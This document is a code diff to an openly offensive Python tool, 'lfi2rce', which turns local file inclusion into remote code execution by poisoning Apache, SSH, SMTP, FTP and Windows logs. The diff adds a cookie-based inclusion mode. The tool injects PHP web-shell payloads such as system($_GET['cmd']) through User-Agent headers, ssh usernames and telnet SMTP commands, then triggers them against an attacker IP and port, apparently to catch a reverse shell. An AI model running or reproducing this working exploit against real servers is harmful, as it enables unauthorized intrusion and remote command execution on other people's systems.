@@ -32,6 +32,8 @@ def Help():
 	print ("    -t <poison type>")
 	print ("    -r <attacker ip address>")
 	print ("    -p <attacker port>\n")
+	print ("Cookie mode:                  (lfi2rce via cookies)\n")
+	print ("    --cookie <value>\n")
 	print ("Override default log paths:   (this will follow selected poison type schema)\n")
 	print ("    -l <log file>\n")
 	print ("Poison types:\n")
@@ -46,6 +48,7 @@ def Help():
 	print ('    python3 lfi2rce -u "http://ghost.server/index.php?search=" -t smtp -r 10.0.2.15 -p 1337 -l /var/mail/secure/mail.log')
 	print ('    python3 lfi2rce -u "http://ghost.server/index.php?search=" -t ftp -r 10.0.2.15 -p 1337')
 	print ('    python3 lfi2rce -u "http://ghost.winserver/index.php?s=" -t windows -r 10.0.2.15 -p 1337')
+	print ('    python3 lfi2rce -u "http://ghost.server/index.php" -t ftp -r 10.0.2.15 -p 1337 --cookie session')
 
 def autoconnect():
 
@@ -57,15 +60,30 @@ def linux_apache_log_poison():
 	print ("💀 Poison " + apache_file_to_poison)
 	headers = { "User-Agent": "<?php $sysvar='system';echo $sysvar($_GET['cmd']); ?>" }
 	print ("💀 Sending payload\n")
-	requests.get(url + apache_file_to_poison, headers=headers)
+	
+	if ck == True:
+
+		requests.get(url, cookies={cookie:apache_file_to_poison}, headers=headers)
+
+	else:
+	
+		requests.get(url + apache_file_to_poison, headers=headers)
+	
 	c = threading.Thread(target=autoconnect)
 	c.start()
 
 	while True:
 
 		try:
-			requests.get(url + apache_file_to_poison + '&cmd=' + payload)	
-			time.sleep(1)
+
+			if ck == True:
+	
+				requests.get(url + '?' + cookie + '=' + apache_file_to_poison + '&cmd=' + payload, cookies={cookie:apache_file_to_poison})
+				time.sleep(1)
+
+			else:
+				requests.get(url + apache_file_to_poison + '&cmd=' + payload)	
+				time.sleep(1)				
 	
 		except KeyboardInterrupt:
 
@@ -79,7 +97,14 @@ def linux_ssh_log_poison():
 	os.system("ssh '<?php system($_GET[\"cmd\"]); ?>'@" + target_host + ' -p ' + target_ssh_port)
 	c = threading.Thread(target=autoconnect)
 	c.start()
-	requests.get(url + ssh_file_to_poison + '&cmd=' + payload)
+	
+	if ck == True:
+	
+		requests.get(url + '?' + cookie + '=' + ssh_file_to_poison + '&cmd=' + payload, cookies={cookie:ssh_file_to_poison})
+	
+	else:
+	
+		requests.get(url + ssh_file_to_poison + '&cmd=' + payload)
 
 def linux_smtp_log_poison():
 
@@ -89,7 +114,14 @@ def linux_smtp_log_poison():
 	os.system("{ printf \"MAIL FROM:<unknow@mail.com>\n\"; sleep 1; printf \"RCPT TO:<?php system(\$_GET['cmd']); ?>\n\"; sleep 1; } | telnet " + target_host + " " + target_smtp_port)
 	c = threading.Thread(target=autoconnect)
 	c.start()
-	requests.get(url + smtp_file_to_poison + '&cmd=' + payload)
+	
+	if ck == True:
+
+		requests.get(url + '?' + cookie + '=' + smtp_file_to_poison + '&cmd=' + payload, cookies={cookie:smtp_file_to_poison})
+	
+	else:
+	
+		requests.get(url + smtp_file_to_poison + '&cmd=' + payload)
 
 def linux_ftp_log_poison():
 
@@ -114,8 +146,14 @@ def linux_ftp_log_poison():
 	while True:
 	
 		try:
-			requests.get(url + ftp_file_to_poison + '&cmd=' + payload)
-			time.sleep(1)
+		
+			if ck == True:
+			
+				requests.get(url + '?' + cookie + '=' + ftp_file_to_poison + '&cmd=' + payload, cookies={cookie:ftp_file_to_poison})
+			
+			else:
+				requests.get(url + ftp_file_to_poison + '&cmd=' + payload)
+				time.sleep(1)
 
 		except KeyboardInterrupt:
 
@@ -131,12 +169,33 @@ def windows_apache_log_poison():
 	print ("💀 Poison " + windows_apache_file_to_poison)
 	headers = { "User-Agent": "<?php $sysvar='system';echo $sysvar($_GET['cmd']); ?>" }
 	print ("💀 Sending payload\n")
-	requests.get(url + windows_apache_file_to_poison, headers=headers)
+	
+	if ck == True:
+	
+		requests.get(url, cookies={cookie:windows_apache_file_to_poison}, headers=headers)
+	
+	else:
+	
+		requests.get(url + windows_apache_file_to_poison, headers=headers)
+	
 	c = threading.Thread(target=autoconnect)
 	c.start()
-	requests.get(url + windows_apache_file_to_poison + '&cmd=' + payload)
+	
+	if ck == True:
+	
+		requests.get(url + '?' + cookie + '=' + windows_apache_file_to_poison + '&cmd=' + payload, cookies={cookie:windows_apache_file_to_poison})
+	
+	else:
+	
+		requests.get(url + windows_apache_file_to_poison + '&cmd=' + payload)
 
+ck = False
 def Main():
+	
+	if len(sys.argv) <= 1:
+
+		Help()
+		sys.exit(1)
 
 	if '-h' in sys.argv or '--help' in sys.argv:
 
@@ -167,8 +226,12 @@ def Main():
 		if '-l' == arg or '--log' == arg:
 
 			logp = int(parser.index(arg)+1)
+			
+		if '--cookie' == arg:
 
+			cookiep = int(parser.index(arg)+1)
 
+	global ck
 	global log_poison_type
 	global attacker_ip
 	global attacker_port
@@ -179,6 +242,7 @@ def Main():
 	global smtp_file_to_poison
 	global ftp_file_to_poison
 	global windows_apache_file_to_poison
+	global cookie
 	
 	try:
 	
@@ -192,6 +256,20 @@ def Main():
 	
 	except UnboundLocalError:
 		
+		pass
+	
+	except IndexError:
+	
+		Help()
+		sys.exit(1)
+	
+	try:
+	
+		cookie = parser[cookiep]
+		ck = True
+	
+	except UnboundLocalError:
+	
 		pass
 	
 	except IndexError:
@@ -249,45 +327,40 @@ def Main():
 
 		Help()
 		sys.exit(1)
-	
-if len(sys.argv) < 9:
 
-	Help()
-	sys.exit(1)
+	try:
+
+		if log_poison_type == 'apache':
+		
+			linux_apache_log_poison()
+	
+		elif log_poison_type == 'ssh':
+
+			linux_ssh_log_poison()
+
+		elif log_poison_type == 'smtp':
+
+			linux_smtp_log_poison()
+
+		elif log_poison_type == 'ftp':
+
+			linux_ftp_log_poison()
+
+		elif log_poison_type == 'windows':
+
+			windows_apache_log_poison()
+
+		else:
+
+			print("No poison scheme found")
+
+	except NameError:
+
+		Help()
+		sys.exit(1)
+
+	except KeyboardInterrupt:
+
+		sys.exit(1)
 
 Main()
-
-try:
-
-	if log_poison_type == 'apache':
-
-		linux_apache_log_poison()
-
-	elif log_poison_type == 'ssh':
-
-		linux_ssh_log_poison()
-
-	elif log_poison_type == 'smtp':
-
-		linux_smtp_log_poison()
-
-	elif log_poison_type == 'ftp':
-
-		linux_ftp_log_poison()
-
-	elif log_poison_type == 'windows':
-
-		windows_apache_log_poison()
-
-	else:
-
-		print("No poison scheme found")
-
-except NameError:
-
-	Help()
-	sys.exit(1)
-
-except KeyboardInterrupt:
-
-	sys.exit(1)
